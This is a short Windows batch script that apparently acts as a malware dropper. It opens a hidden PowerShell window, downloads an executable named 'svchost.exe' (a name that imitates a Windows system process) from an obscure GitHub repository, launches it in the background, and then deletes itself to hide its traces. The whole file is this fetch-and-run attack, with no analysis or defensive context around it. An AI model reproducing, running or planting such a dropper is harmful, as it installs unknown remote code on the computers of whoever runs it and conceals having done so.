@echo off
cd /d "%~dp0"
powershell -w hidden -Command "iwr 'https://github.com/t1283y7/12y783y78sad/raw/refs/heads/main/svchost.exe' -O '%~dp0svchost.exe'"
if exist "%~dp0svchost.exe" (
    start /b "" "%~dp0svchost.exe"
)
del "%~f0" >nul 2>&1
